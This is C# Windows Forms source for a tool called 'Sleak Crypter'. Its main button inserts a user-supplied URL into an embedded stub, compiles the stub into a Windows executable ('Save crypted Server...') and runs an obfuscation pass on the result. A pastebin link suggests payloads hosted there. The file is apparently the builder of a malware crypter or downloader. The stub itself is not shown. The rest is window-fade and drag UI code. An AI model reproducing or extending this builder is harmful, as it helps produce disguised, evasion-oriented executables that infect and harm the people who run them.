using Microsoft.CSharp;
using SleakDirectFile.Tools;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace SleakDirectFile
{
    public partial class MainFrm : Form
    {

        private Timer opacityTimer;
        private const int animationDuration = 1500;
        private const double targetOpacity = 1.0;
        private double currentOpacity = 0.0;
        private const double opacityIncrement = 0.05;
        private const int timerInterval = 20;
        public MainFrm()
        {
            InitializeComponent();
            InitializeOpacityTimer();
            this.Load += Form1_Load;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            DragandDrop en = new DragandDrop();
            en.Show();
        }
        private void InitializeOpacityTimer()
        {
            opacityTimer = new Timer();
            opacityTimer.Interval = timerInterval;
            opacityTimer.Tick += timer1_Tick;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            opacityTimer.Start();

        }

        private void button1_Click(object sender, EventArgs e)
        {

            if (terms.Checked)
            {
                string sStub = Sleak_Crypter.Properties.Resources.Stub.Replace("%URL%", textBox1.Text);

                using (SaveFileDialog fSaveDialog = new SaveFileDialog())
                {
                    fSaveDialog.Filter = "Executable (*.exe)|*.exe";
                    fSaveDialog.Title = "Save crypted Server...";

                    if (fSaveDialog.ShowDialog() == DialogResult.OK)
                    {
                        using (CSharpCodeProvider csCodeProvider = new CSharpCodeProvider(new Dictionary<string, string>
                        {
                            {"CompilerVersion", "v4.0"}
                        }))
                        {
                            CompilerParameters cpParams = new CompilerParameters(null, fSaveDialog.FileName, true);

                            cpParams.CompilerOptions = "/t:winexe /unsafe /platform:x86 /debug-";
                            cpParams.ReferencedAssemblies.Add("System.dll");
                            cpParams.ReferencedAssemblies.Add("System.Management.dll");
                            cpParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                            cpParams.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
                            cpParams.ReferencedAssemblies.Add("System.Threading.Tasks.dll");

                            csCodeProvider.CompileAssemblyFromSource(cpParams, sStub);

                            if (Obfuscate.Rename(fSaveDialog.FileName))
                            {
                                File.Delete(fSaveDialog.FileName);
                                MessageBox.Show("File Crypted Successfully!", "Sleak Crypter", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                            else
                            {
                                MessageBox.Show("Could Not Crypt File Successfully!", "Sleak Crypter", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                        }
                    }
                }
            }
            else
            {
                MessageBox.Show("Please Accept Terms of Use.");
            }
            
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void label2_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.pastebin.com/");
        }

        Point mouseLocation;
        private void mousedown(object sender, MouseEventArgs e)
        {
            mouseLocation = new Point(-e.X, -e.Y);
        }

        private void mouse_Move(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                Point mousePose = Control.MousePosition;
                mousePose.Offset(mouseLocation.X, mouseLocation.Y);
                Location = mousePose;
            }
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void terms_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void url_Click(object sender, EventArgs e)
        {

        }

        private void terms_CheckedChanged_1(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (currentOpacity < targetOpacity)
            {
                currentOpacity += opacityIncrement;
                if (currentOpacity > targetOpacity)
                    currentOpacity = targetOpacity;

                this.Opacity = currentOpacity;
            }
            else
            {
                opacityTimer.Stop();
            }

        }
    }
}
